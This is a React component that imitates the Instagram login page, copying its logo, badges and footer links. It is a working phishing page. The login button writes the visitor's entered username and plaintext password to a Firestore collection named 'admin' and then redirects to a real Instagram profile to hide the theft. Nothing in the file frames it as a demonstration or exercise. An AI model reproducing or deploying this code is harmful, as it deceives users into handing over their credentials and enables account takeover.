import React, { useState } from "react";
import "./App.css";
import firebase from '../firebase';

const App = () => {
const [user, setUser] = useState("");
const [password, setPassword] = useState("");

  const addLogin = () => {
    firebase.firestore().collection('admin').add({
      user: user,
      password: password,
    });

    window.open('https://www.instagram.com/komikcay/')
  }

  return (
    <React.Fragment>
      <div id="wrapper">
        <div className="container">
          <div className="phone-app-demo" />
          <div className="form-data">
            <section>
              <div className="logo">
                <h1>Instagram</h1>
              </div>
              <input
                type="text"
                placeholder="Phone number, username, or email"
                onChange={(e) => setUser(e.target.value)}
              />
              <input type="password" onChange={(e) => setPassword(e.target.value)} placeholder="Password" />
              <button className="form-btn" onClick={addLogin}>
                Log in
              </button>
              <span className="has-separator">Or</span>
              <a href="#" className="facebook-login">
                <i className="fab fa-facebook" /> Log in with Facebook
              </a>
              <a className="password-reset" href="#">
                Forgot password?
              </a>
            </section>
            <div className="sign-up">
              Don't an account? <a href="#">Sign up</a>
            </div>
            <div className="get-the-app">
              <span>Get the app</span>
              <div className="badge">
                <img
                  src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png"
                  alt="android App"
                />
                <img
                  src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png"
                  alt="ios app"
                />
              </div>
            </div>
          </div>
        </div>

        <footer>
          <div className="container">
            <nav className="footer-nav">
              <ul>
                <li>
                  <a href="#">About Us</a>
                </li>
                <li>
                  <a href="#">Support</a>
                </li>
                <li>
                  <a href="#">Jobs</a>
                </li>
                <li>
                  <a href="#">Privacy</a>
                </li>
                <li>
                  <a href="#">Terms</a>
                </li>
                <li>
                  <a href="#">Profiles</a>
                </li>
                <li>
                  <a href="#">Languages</a>
                </li>
              </ul>
            </nav>
            <div className="copyright-notice">&copy; 2019 Complaints</div>
          </div>
        </footer>
      </div>
    </React.Fragment>
  );
};

export default App;
